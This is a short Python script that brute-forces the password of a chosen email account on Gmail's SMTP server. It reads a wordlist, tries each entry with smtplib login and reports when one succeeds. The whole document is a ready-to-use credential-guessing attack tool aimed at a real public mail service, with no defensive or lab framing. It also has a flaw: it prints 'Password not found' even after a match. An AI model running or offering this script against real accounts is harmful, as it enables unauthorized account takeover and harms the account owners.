#!/usr/bin/env python3
"""
brute_force_smtp.py - Brute force an smtp server.
"""

import smtplib
from termcolor import colored

smtp_server = "smtp.gmail.com"
smtp_port = 587
smtp = smtplib.SMTP(smtp_server, smtp_port)
smtp.ehlo()
smtp.starttls() 

username = input("[*] Enter target email address: ")
password_file_path = input("[*] Enter password file path: ")


with open(password_file_path, 'r') as password_file:
    for password in password_file:
        password = password.strip('\n')
        try:
            smtp.login(username, password)
            print(colored("[+] Password found: " + password, "green"))
            break
        except smtplib.SMTPAuthenticationError:
            print(colored("[-] Password not found: " + password, "red"))
            continue
        except smtplib.SMTPException:
            print(colored("[-] Password not found: " + password, "red"))
            continue
        except KeyboardInterrupt:
            print(colored("[-] User Interrupt", "red"))
            break
        except Exception as e:
            print(colored("[-] Error: " + str(e), "red"))
            continue
    print(colored("[-] Password not found", "red"))
    smtp.quit()
    exit()

smtp.quit()
exit()